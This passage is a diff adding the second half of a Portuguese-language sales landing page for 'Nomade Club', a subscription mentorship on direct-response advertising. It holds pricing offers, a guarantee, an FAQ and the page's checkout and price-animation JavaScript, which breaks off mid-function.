+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- BLOCO 13: PLACAS -->
+<section class="sec in" id="placas" style="padding-top:0">
+  <div class="mid">
+    <div class="sh"><span class="tag"><i></i>Reconhecimento</span><h2 class="js-split"><span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">No</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">Nomade</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">Club,</span></span> <em><span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">resultado</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">tem</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">placa</span></span></em></h2><p class="muted">Quando você bate um marco de faturamento, você não comemora sozinho. Você ganha uma placa de premiação física, para pendurar na parede, e é reconhecido na frente de todo o clube. Quais são as placas e como funciona cada marco, eu te mostro lá dentro.</p></div>
+    <figure class="plaque-hero js-plaque"><img src="https://nomadeclub.com.br/midia/placa-premiacao.webp" srcset="https://nomadeclub.com.br/midia/placa-premiacao-800.webp 800w, https://nomadeclub.com.br/midia/placa-premiacao.webp 1536w" sizes="(min-width: 1020px) 980px, 92vw" alt="Placa de premiação do Nomade Club pendurada na parede de um escritório" width="1536" height="1024" decoding="async"><figcaption><i></i>Placa de premiação Nomade Club</figcaption></figure>
+    <div class="col letter" style="margin-top:2em;text-align:center">
+      <p>Cada placa é a prova de que o Método Nômade funciona na vida real, com gente real.</p>
+      <p class="big">A pergunta é: qual vai ser a sua primeira?</p>
+    </div>
+  </div>
+</section>
+
+<!-- BLOCO 14: PARA QUEM -->
+<section class="sec in" style="padding-top:0">
+  <div class="mid">
+    <div class="sh"><h2 class="js-split"><span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">O</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">Nomade</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">Club</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">não</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">é</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">para</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">todo</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">mundo.</span></span> <em><span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">E</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">ainda</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">bem.</span></span></em></h2></div>
+    <div class="fit">
+      <div class="card yes js-rv" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up"><h3>É para você se</h3><ul>
+        <li><svg><use href="#i-check"></use></svg>Quer faturar alto com direct response e não se contenta em vender só para o Brasil</li>
+        <li><svg><use href="#i-check"></use></svg>Quer receber em euro, dólar e outras moedas fortes</li>
+        <li><svg><use href="#i-check"></use></svg>Sonha em trabalhar de qualquer lugar do mundo, e não só pagar boleto de casa</li>
+        <li><svg><use href="#i-check"></use></svg>Está começando agora e quer aprender do jeito certo, desde o primeiro dia</li>
+        <li><svg><use href="#i-check"></use></svg>Já roda tráfego, mas sente que bateu no teto</li>
+        <li><svg><use href="#i-check"></use></svg>Topa testar, medir e ajustar, toda semana</li></ul></div>
+      <div class="card no js-rv" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up"><h3>Não é para você se</h3><ul>
+        <li><svg><use href="#i-x"></use></svg>Procura dinheiro fácil, sem trabalho</li>
+        <li><svg><use href="#i-x"></use></svg>Quer um botão mágico que faz tudo sozinho enquanto você assiste</li>
+        <li><svg><use href="#i-x"></use></svg>Compra curso para deixar parado numa aba do navegador</li>
+        <li><svg><use href="#i-x"></use></svg>Não está disposto a investir nada em anúncio para testar suas ofertas</li>
+        <li><svg><use href="#i-x"></use></svg>Acha que já sabe tudo e não quer aprender com quem está operando agora</li></ul></div>
+    </div>
+    <p style="margin-top:1.6em">Se você se reconheceu na primeira lista, continua. O que vem agora é para você.</p>
+  </div>
+</section>
+
+<!-- BLOCO 15: CUSTO -->
+<section class="sec in" style="padding-top:0">
+  <div class="col">
+    <div class="sh"><h2 class="js-split"><span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">Antes</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">de</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">falar</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">de</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">preço,</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">vamos</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">falar</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">de</span></span> <em><span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">quanto</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">custa</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">ficar</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">de</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">fora</span></span></em></h2></div>
+    <div class="letter">
+      <p>Cada mês vendendo só em real é um mês deixando dinheiro na mesa.</p>
+      <p>Cada oferta que você testa sozinho, no escuro, é verba que vai embora. R$500, R$1.000, R$3.000 por teste que não deu certo.</p>
+      <p>Cada mês preso em casa, operando da mesma mesa, é um mês da sua vida que não volta.</p>
+      <p>Agora compara com as alternativas:</p>
+    </div>
+    <div class="fares">
+      <div class="fare js-rv" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up"><b>Mentoria individual com quem fatura de verdade</b><span>5 a 6 dígitos</span></div>
+      <div class="fare js-rv" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up"><b>Curso gravado</b><span>R$1.997 a R$5.997</span><small>E envelhece antes de você terminar.</small></div>
+      <div class="fare js-rv" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up"><b>Contratar um gestor de tráfego</b><span>R$2 a 3 mil/mês</span><small>Mais porcentagem sobre o resultado.</small></div>
+      <div class="fare js-rv" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up"><b>Aprender sozinho</b><span>O mais caro</span><small>Você paga com verba, com tempo e com anos.</small></div>
+      <div class="fare us js-rv" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up"><b>Nomade Club no lançamento</b><span>R$97,90/mês</span></div>
+    </div>
+    <div class="letter" style="margin-top:2em">
+      <p>No Nomade Club você tem call ao vivo toda semana, o Método Nômade completo, a oferta do mês, o seu Gestor de Tráfego com IA, a plataforma, o fórum e as placas.</p>
+      <p>O preço normal do Nomade Club vai ser R$297 por mês. E, sinceramente, ainda é barato pelo que você recebe.</p>
+      <p class="big">Mas, só neste lançamento, eu vou fazer diferente.</p>
+    </div>
+  </div>
+</section>
+
+<!-- BLOCO 16: OFERTA -->
+<section class="offer sec in" id="oferta" style="padding-top:clamp(40px,6vw,72px)">
+  <div class="sh center"><span class="tag"><i></i>Seu passe para o Nomade Club</span><h2 class="js-split"><span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">Tudo</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">o</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">que</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">você</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">recebe</span></span> <em><span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">entrando</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">hoje</span></span></em></h2></div>
+  <div class="ticket" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up">
+    <div class="t-main">
+      <div class="t-head"><b><svg class="logo"><use href="#logo"></use></svg>Nomade Club</b><span>Passe mensal</span></div>
+      <ul class="incl">
+        <li><svg><use href="#i-check"></use></svg><span>Call ao vivo comigo, toda semana</span></li>
+        <li><svg><use href="#i-check"></use></svg><span>O Método Nômade completo: criar, validar, escalar e automatizar</span></li>
+        <li><svg><use href="#i-check"></use></svg><span>Plataforma com todas as aulas gravadas e conteúdo extra</span></li>
+        <li><svg><use href="#i-check"></use></svg><span>Fórum exclusivo de membros</span></li>
+        <li><svg><use href="#i-check"></use></svg><span>Placas de premiação por faturamento</span></li>
+        <li><svg><use href="#i-check"></use></svg><span><em>Bônus 1:</em> a Oferta do Mês, pronta para rodar</span></li>
+        <li><svg><use href="#i-check"></use></svg><span><em>Bônus 2:</em> seu Gestor de Tráfego com IA</span></li>
+        <li><svg><use href="#i-check"></use></svg><span><em>Bônus 3:</em> replay de todas as calls</span></li>
+        <li><svg><use href="#i-check"></use></svg><span><em>Bônus 4:</em> construtor de páginas e quizzes, grátis</span></li>
+      </ul>
+    </div>
+    <div class="t-stub">
+      <p class="was">Depois do lançamento: <s id="strike" class="js-strike">R$297/mês</s></p>
+      <p class="price-lbl">Preço de lançamento</p>
+      <div class="price"><span class="cur">R$</span><div class="flaps js-price" id="priceFlaps" data-len="6" data-align="right" data-from="297,00" aria-label="97 reais e 90 centavos"><span class="cell gone" aria-hidden="true"><span class="ch">&nbsp;</span></span><span class="cell" aria-hidden="true"><span class="ch">9</span></span><span class="cell" aria-hidden="true"><span class="ch">7</span></span><span class="cell" aria-hidden="true"><span class="ch">,</span></span><span class="cell" aria-hidden="true"><span class="ch">9</span></span><span class="cell" aria-hidden="true"><span class="ch">0</span></span></div><span class="per">/mês</span></div>
+      <p class="perday">Isso dá <b>R$3,26 por dia.</b> Menos que um café. Menos que um único clique errado no seu gerenciador de anúncios.</p>
+      <div class="locked"><svg><use href="#i-lock"></use></svg><span><b>Quem entra agora trava esse preço.</b> Enquanto mantiver a assinatura ativa, você continua pagando R$97,90 por mês, mesmo depois que o preço subir para R$297.</span></div>
+      <a class="cta block js-cta js-buy-mensal" href="https://pay.cakto.com.br/giz4ren_1188139?utm_source=organic&amp;utm_campaign=&amp;utm_medium=&amp;utm_content=&amp;utm_term=" target="_blank" rel="noopener" id="8e14da0f-e20a-9109-b5fa-b7060c34a025">Quero entrar por R$97,90/mês<span class="ar"><svg><use href="#i-arrow"></use></svg></span></a>
+      <p class="pay">Cartão de crédito ou Pix. Acesso imediato. Cancele quando quiser.</p>
+    </div>
+  </div>
+
+  <div class="plan-or" aria-hidden="true">ou economize no semestral</div>
+  <div class="semi js-rv" id="semestral" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up">
+    <span class="semi-badge"><svg><use href="#i-check"></use></svg>Economize R$140,40</span>
+    <div class="semi-info">
+      <div class="t-head"><b><svg class="logo"><use href="#logo"></use></svg>Nomade Club</b><span>Passe semestral</span></div>
+      <h3>Pague uma vez e fique 6 meses dentro do clube</h3>
+      <p>É tudo o que está no passe mensal, pelos próximos 6 meses, com um desconto que o mensal não tem.</p>
+      <ul class="semi-points">
+        <li><svg><use href="#i-check"></use></svg><span>Tudo do passe mensal, incluindo os 4 bônus</span></li>
+        <li><svg><use href="#i-check"></use></svg><span>6 meses de calls ao vivo comigo, toda semana</span></li>
+        <li><svg><use href="#i-check"></use></svg><span>Placas de premiação por faturamento</span></li>
+        <li><svg><use href="#i-check"></use></svg><span>Um pagamento só, sem cobrança todo mês no cartão</span></li>
+        <li><svg><use href="#i-check"></use></svg><span>7 dias de garantia, igual ao mensal</span></li>
+      </ul>
+    </div>
+    <div class="semi-price">
+      <p class="was">Pagando mês a mês: <s class="js-strike">R$587,40</s></p>
+      <p class="price-lbl">Plano semestral</p>
+      <div class="price"><span class="cur">R$</span><div class="flaps js-price" id="priceFlapsSemi" data-len="6" data-align="right" data-from="587,40" aria-label="447 reais"><span class="cell" aria-hidden="true"><span class="ch">4</span></span><span class="cell" aria-hidden="true"><span class="ch">4</span></span><span class="cell" aria-hidden="true"><span class="ch">7</span></span><span class="cell" aria-hidden="true"><span class="ch">,</span></span><span class="cell" aria-hidden="true"><span class="ch">0</span></span><span class="cell" aria-hidden="true"><span class="ch">0</span></span></div><span class="per">à vista</span></div>
+      <p class="eq">Equivale a <b>R$74,50 por mês</b>, pelos 6 meses.</p>
+      <span class="save"><svg><use href="#i-check"></use></svg>24% mais barato que o mensal</span>
+      <a class="cta block js-cta js-buy-semestral" href="https://pay.cakto.com.br/3dfrneh_1188360?utm_source=organic&amp;utm_campaign=&amp;utm_medium=&amp;utm_content=&amp;utm_term=" target="_blank" rel="noopener" id="07fd0f70-b5b5-0ff2-85ec-3fc01efaa9a9">Quero o plano semestral<span class="ar"><svg><use href="#i-arrow"></use></svg></span></a>
+      <p class="pay">Cartão de crédito ou Pix. Acesso imediato.</p>
+    </div>
+  </div>
+  <div class="col letter" style="margin-top:clamp(40px,5vw,56px)">
+    <h3>“Por que tão barato no lançamento, Jeferson?”</h3>
+    <p>Porque eu quero encher o clube com os primeiros membros, os que vão crescer junto comigo e virar os primeiros cases do Nomade Club. Esses merecem pagar menos. Quando o lançamento acabar, o preço vai para R$297 por mês, e quem entrar depois paga o preço cheio.</p>
+  </div>
+</section>
+
+<!-- BLOCO 17: GARANTIA -->
+<section class="sec in" id="garantia" style="padding-top:0">
+  <div class="guar mid">
+    <div class="gstamp js-gstamp" aria-hidden="true" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up">
+      <svg viewBox="0 0 220 220">
+        <defs>
+          <path id="gc" d="M110,110 m-82,0 a82,82 0 1,1 164,0 a82,82 0 1,1 -164,0"></path>
+          <filter id="ink"><feTurbulence type="fractalNoise" baseFrequency="1.1" numOctaves="2" seed="7"></feTurbulence><feColorMatrix values="0 0 0 0 0  0 0 0 0 0  0 0 0 0 0  0 0 0 -2.2 1.5"></feColorMatrix><feComposite in="SourceGraphic" operator="in"></feComposite></filter>
+        </defs>
+        <g filter="url(#ink)">
+          <circle cx="110" cy="110" r="104" fill="none" stroke="currentColor" stroke-width="5"></circle>
+          <circle cx="110" cy="110" r="66" fill="none" stroke="currentColor" stroke-width="2.5"></circle>
+          <text font-size="14" letter-spacing="2.4"><textPath href="#gc">GARANTIA PASSAPORTE ✦ 100% DO SEU DINHEIRO DE VOLTA ✦</textPath></text>
+          <text x="110" y="114" text-anchor="middle" font-size="50">7</text>
+          <text x="110" y="140" text-anchor="middle" font-size="15" letter-spacing="4">DIAS</text>
+        </g>
+      </svg>
+    </div>
+    <div>
+      <div class="sh"><span class="tag"><i></i>Garantia Passaporte</span><h2 class="js-split"><span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">7</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">dias</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">para</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">conhecer</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">o</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">clube</span></span> <em><span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">sem</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">arriscar</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">nada</span></span></em></h2></div>
+      <div class="letter">
+        <p>Entra hoje. Assiste à call da semana. Pega a oferta do mês. Explora a plataforma, entra no fórum, vê o Método Nômade por dentro.</p>
+        <p>Se em até 7 dias você achar que o Nomade Club não é para você, é só pedir. <strong>Eu devolvo 100% do seu dinheiro.</strong> Sem pergunta, sem burocracia, sem ressentimento.</p>
+        <p>E depois dos 7 dias? Você continua livre. <strong>Cancela quando quiser, com poucos cliques.</strong> Sem fidelidade, sem multa.</p>
+        <p class="big">O risco é todo meu. O único jeito de você perder é ficando de fora.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- BLOCO 18: CAMINHOS -->
+<section class="sec in" style="padding-top:0">
+  <div class="sh"><h2 class="js-split"><span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">Agora</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">você</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">tem</span></span> <em><span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">três</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">caminhos</span></span></em> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">na</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">sua</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">frente</span></span></h2></div>
+  <div class="paths">
+    <div class="card path js-rv" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up">
+      <svg class="line" viewBox="0 0 200 30" aria-hidden="true"><circle cx="8" cy="15" r="6" fill="#BFA79E"></circle><path d="M14 15h120" stroke="#BFA79E" stroke-width="2" stroke-dasharray="4 6"></path><path d="M140 7l12 16M152 7l-12 16" stroke="#FF8A86" stroke-width="2.4" stroke-linecap="round"></path></svg>
+      <span class="pn">Caminho 1</span><h3>Fechar esta página e continuar como está</h3>
+      <p>Vendendo só para o Brasil, só em real, brigando no mesmo leilão de sempre. Daqui a um ano você vai estar exatamente onde está hoje. Talvez pior, porque o mercado não espera ninguém.</p>
+    </div>
+    <div class="card path js-rv" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up">
+      <svg class="line" viewBox="0 0 200 30" aria-hidden="true"><circle cx="8" cy="15" r="6" fill="#BFA79E"></circle><path d="M14 15c20-18 30 18 50 0s30-18 50 0 30 18 50 0" fill="none" stroke="#BFA79E" stroke-width="2" stroke-dasharray="4 6"></path><circle cx="190" cy="15" r="5" fill="none" stroke="#BFA79E" stroke-width="2"></circle></svg>
+      <span class="pn">Caminho 2</span><h3>Tentar fazer sozinho</h3>
+      <p>Pode dar certo. Eu demorei anos e queimei muita verba até descobrir o que eu vou te mostrar no clube. Você pode pagar esse mesmo preço. Com dinheiro e com tempo.</p>
+    </div>
+    <div class="card path go js-rv" style="translate: none; rotate: none; scale: none;" data-imp-reveal="up">
+      <svg class="line" viewBox="0 0 200 30" aria-hidden="true"><circle cx="8" cy="15" r="6" fill="#FFC24B"></circle><path d="M14 15H170" stroke="#FFC24B" stroke-width="2.5"></path><g transform="translate(176 3)" color="#FFC24B"><use href="#i-sun" width="24" height="24"></use></g></svg>
+      <span class="pn">Caminho 3</span><h3>Entrar no Nomade Club hoje</h3>
+      <p>Aprender o Método Nômade com quem está operando agora, ao vivo, toda semana. Pegar a oferta do mês. Construir o seu Gestor de Tráfego com IA. E começar a vender para o mundo.</p>
+      <p>Por R$97,90 por mês, com 7 dias de garantia e cancelamento quando quiser.</p>
+    </div>
+  </div>
+  <div class="col letter" style="margin-top:2em">
+    <p>E cada semana fora é uma call que você perde e uma oferta do mês que outra pessoa vai rodar no seu lugar.</p>
+    <p>E tem mais: <strong>R$97,90 é preço de lançamento.</strong> Quando acabar, o Nomade Club vai para R$297 por mês. Quem entra agora trava R$97,90 enquanto mantiver a assinatura. Quem deixa para depois paga três vezes mais pela mesma coisa.</p>
+  </div>
+  <div class="cta-row center"><a class="cta js-cta" href="#oferta" id="4840482c-1b20-fba0-a388-a7afb8e8b0e8">Eu escolho o caminho 3: quero entrar agora<span class="ar"><svg><use href="#i-arrow"></use></svg></span></a></div>
+</section>
+
+<!-- BLOCO 19: FAQ -->
+<section class="sec in" id="faq" style="padding-top:0">
+  <div class="col">
+    <div class="sh"><h2 class="js-split"><span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">Perguntas</span></span> <em><span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">frequentes</span></span></em></h2></div>
+    <div class="faq">
+      <details><summary>Eu sou iniciante total. Serve para mim?<i></i></summary><p class="ans">Serve. O Método Nômade começa do zero, na etapa de criar a oferta. Você ainda tem call semanal para tirar dúvida e a oferta do mês para já começar rodando.</p></details>
+      <details><summary>Preciso falar inglês ou outro idioma?<i></i></summary><p class="ans">Não. Eu te mostro como criar copy e criativo em outros idiomas com ajuda da IA, e você pode começar pela América Latina, em espanhol.</p></details>
+      <details><summary>Quanto eu preciso investir em anúncios?<i></i></summary><p class="ans">Depende da oferta e do país. Dentro do clube eu te mostro como validar gastando pouco, antes de colocar mais dinheiro numa oferta.</p></details>
+      <details><summary>Como funcionam as calls ao vivo?<i></i></summary><p class="ans">Toda semana, comigo, ao vivo. Se o fuso não bater ou você não puder assistir, a gravação fica na plataforma.</p></details>
+      <details><summary>Como funciona a oferta do mês?<i></i></summary><p class="ans">Todo mês sai uma oferta do que a gente constrói nas calls, pronta para você rodar. Ela é um bônus. O principal é você aprender a criar as suas.</p></details>
+      <details><summary>Preciso saber programar para montar o Gestor de Tráfego com IA?<i></i></summary><p class="ans">Não. Eu te ensino passo a passo, do zero.</p></details>
+      <details><summary>Funciona para infoproduto, nutra e SaaS?<i></i></summary><p class="ans">Sim. A gente passa por todos: infoproduto, nutracêutico, SaaS e recorrência.</p></details>
+      <details><summary>É curso gravado?<i></i></summary><p class="ans">Não. É mentoria ao vivo, toda semana. As gravações ficam na plataforma como apoio.</p></details>
+      <details><summary>Qual a diferença entre o plano mensal e o semestral?<i></i></summary><p class="ans">O conteúdo é o mesmo, com os mesmos bônus. No mensal você paga R$97,90 por mês e pode cancelar quando quiser. No semestral você paga R$447 uma vez só e fica 6 meses no clube, o que dá R$74,50 por mês.</p></details>
+      <details><summary>Posso cancelar quando quiser?<i></i></summary><p class="ans">No plano mensal, pode: sem fidelidade e sem multa. No semestral, você paga os 6 meses de uma vez. Nos dois planos, se cancelar nos primeiros 7 dias, recebe 100% do dinheiro de volta.</p></details>
+      <details><summary>O preço vai subir para mim depois?<i></i></summary><p class="ans">Não. Quem assina no preço de lançamento paga R$97,90 por mês enquanto mantiver a assinatura. O aumento para R$297 vale só para quem entrar depois.</p></details>
+      <details><summary>E se eu cancelar e quiser voltar?<i></i></summary><p class="ans">Você volta pelo preço que estiver valendo no dia. Por isso vale a pena travar o preço de lançamento agora.</p></details>
+      <details><summary>Quais as formas de pagamento?<i></i></summary><p class="ans">Cartão de crédito e Pix. No plano mensal a cobrança é recorrente, todo mês. No semestral, você paga uma vez só pelos 6 meses.</p></details>
+    </div>
+  </div>
+</section>
+
+<!-- BLOCO 20: FINAL -->
+<section class="scene" id="final">
+  <div class="scene-media" id="sceneMedia" style="translate: none; rotate: none; scale: none; transform: translate(0%, -6%);"><img src="https://nomadeclub.com.br/midia/paris-foto.webp" srcset="https://nomadeclub.com.br/midia/paris-foto-720.webp 720w, https://nomadeclub.com.br/midia/paris-foto.webp 1125w" sizes="100vw" alt="Jeferson Borges em Paris, ao entardecer" width="1125" height="1500" decoding="async" style="translate: none; rotate: none; scale: none; transform: scale(1.15, 1.15);"></div>
+  <div class="grain" aria-hidden="true"></div>
+  <div class="in">
+    <div class="copy">
+      <h2 class="js-split"><span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">A</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">decisão</span></span> <em><span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">é</span></span> <span class="w"><span style="translate: none; rotate: none; scale: none; transform: translate(0%, 110%);">sua</span></span></em></h2>
+      <div class="letter">
+        <p>O mundo inteiro está comprando agora. Em euro, em dólar e em mais de 30 moedas. Na Europa, na Ásia, nas Américas e na Oceania.</p>
+        <p>A única pergunta é se você vai continuar assistindo de fora ou se vai entrar no jogo.</p>
+        <p>Eu te espero na próxima call.</p>
+        <p>Um abraço,</p>
+        <p class="sign">Jeferson Borges</p>
+      </div>
+      <div class="cta-row" style="margin-top:.4em">
+        <a class="cta js-cta" href="#oferta" id="90f764a5-0b9d-3f30-d503-d2b539fad1c0">Quero entrar no Nomade Club agora<span class="ar"><svg><use href="#i-arrow"></use></svg></span></a>
+        <p class="micro" style="flex-direction:column;gap:2px"><span>R$97,90/mês, 7 dias de garantia</span><span>Cancele quando quiser</span></p>
+      </div>
+    </div>
+  </div>
+</section>
+<section class="in" style="padding-block:0 clamp(56px,8vw,96px)">
+  <div class="ps col">
+    <p><b>P.S.</b> Se você pulou direto para o final, aqui vai o resumo. O Nomade Club é a mentoria ao vivo, toda semana, onde eu te ensino o Método Nômade: criar, validar, escalar e automatizar ofertas para vender no mundo inteiro, recebendo em moeda forte. Você ainda ganha a oferta do mês, o seu Gestor de Tráfego com IA e o replay de todas as calls. Tudo por R$97,90 por mês no preço de lançamento, travado enquanto você for assinante, com 7 dias de garantia incondicional e cancelamento quando quiser. <a class="js-cta" href="#oferta" id="076b35bf-8997-ae00-38a7-d7c20024d5cb">Clique aqui para entrar.</a></p>
+    <p><b>P.P.S.</b> O preço de R$97,90 é só de lançamento. Depois, o Nomade Club passa a custar R$297 por mês. Quem entra agora trava R$97,90 enquanto mantiver a assinatura. Quem deixa para depois paga três vezes mais pela mesma coisa.</p>
+  </div>
+</section>
+</main>
+
+<footer class="in"><p>Nomade Club é um produto da BORGES DIRECT RESPONSE LLC. © 2026. Todos os direitos reservados.</p></footer>
+
+<div class="dock" id="dock" aria-hidden="true">
+  <div class="dock-in">
+    <div class="dock-price"><b>R$97,90/mês</b><small>Lançamento, depois <s>R$297</s></small></div>
+    <a class="cta js-cta" href="#oferta" tabindex="-1" id="996871b8-32a0-68d0-2c8d-a0597a6045ac">Entrar agora<span class="ar"><svg><use href="#i-arrow"></use></svg></span></a>
+  </div>
+</div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/ScrollTrigger.min.js"></script>
+<script>
+/* ============================================================
+   COLE AQUI O LINK DO SEU CHECKOUT (Hotmart, Kiwify etc.)
+   Enquanto estiver vazio, os botões levam até a oferta na página.
+   ============================================================ */
+const CHECKOUT_URL = "https://pay.cakto.com.br/giz4ren_1188139";            // checkout do plano mensal (R$97,90/mês)
+const CHECKOUT_URL_SEMESTRAL = "https://pay.cakto.com.br/3dfrneh_1188360";  // checkout do plano semestral (R$447)
+/* COLE AQUI O LINK DO SEU INSTAGRAM (ex.: https://instagram.com/seuperfil). Vazio = botão escondido. */
+const INSTAGRAM_URL = "https://www.instagram.com/borges.online/";
+
+(function(){
+  const RM = matchMedia('(prefers-reduced-motion: reduce)').matches;
+  const $=(s,c=document)=>c.querySelector(s), $$=(s,c=document)=>Array.from(c.querySelectorAll(s));
+  /* os botões ao longo da página levam até os planos; só os botões de cada plano vão para o checkout */
+  const go=(sel,url)=>{ if(url) $$(sel).forEach(a=>{ a.href=url; a.target='_blank'; a.rel='noopener'; }); };
+  go('.js-buy-mensal',CHECKOUT_URL); go('.js-buy-semestral',CHECKOUT_URL_SEMESTRAL);
+  if(INSTAGRAM_URL){ $$('.js-insta').forEach(a=>{ a.href=INSTAGRAM_URL; a.hidden=false; }); }
+
+  /* ---------- split flaps ---------- */
+  const GLYPHS='ABCDEFGHIJKLMNOPQRSTUVWXYZÁÂÃÉÍÓÚÇ0123456789$€';
+  function buildFlaps(el){
+    const len=+el.dataset.len||el.textContent.trim().length;
+    const fit=w=> el.dataset.align==='right'? w.padStart(len,' ').slice(-len) : w.padEnd(len,' ').slice(0,len);
+    el.fit=fit; const word=fit(el.textContent.trim()); el.textContent=''; el.cells=[];
+    for(let i=0;i<len;i++){ const c=document.createElement('span'); c.className='cell'; c.setAttribute('aria-hidden','true'); const ch=document.createElement('span'); ch.className='ch'; ch.textContent=word[i]===' '?' ':word[i]; c.appendChild(ch); el.appendChild(c); el.cells.push(ch); }
+    el.word=word;
+  }
+  function flipTo(el,word,speed=48){
+    word=el.fit(word);
+    if(RM){ el.cells.forEach((ch,i)=>ch.textContent=word[i]===' '?' ':word[i]); el.word=word; return Promise.resolve(); }
+    const jobs=el.cells.map((ch,i)=>new Promise(res=>{
+      const target=word[i]; if(target===el.word[i]){res();return;}
+      let steps=3+((i*7)%5)+Math.floor(Math.random()*3); const cell=ch.parentNode;
+      setTimeout(function tick(){ const c=steps<=0?target:GLYPHS[Math.floor(Math.random()*GLYPHS.length)]; ch.textContent=c===' '?' ':c; cell.classList.remove('f'); void cell.offsetWidth; cell.classList.add('f'); if(steps--<=0){res();return;} setTimeout(tick,speed); }, i*28);
+    }));
+    el.word=word; return Promise.all(jobs);
+  }
+  $$('.flaps').forEach(buildFlaps);
+  const collapse=el=>{ if(el.dataset.align==='right') el.querySelectorAll('.cell').forEach(c=>c.classList.toggle('gone',c.textContent.trim()==='')); };
+  $$('.flaps').forEach(collapse);
+  const fio=new IntersectionObserver(es=>es.forEach(e=>{
+    if(!e.isIntersecting) return; fio.unobserve(e.target); const t=e.target;
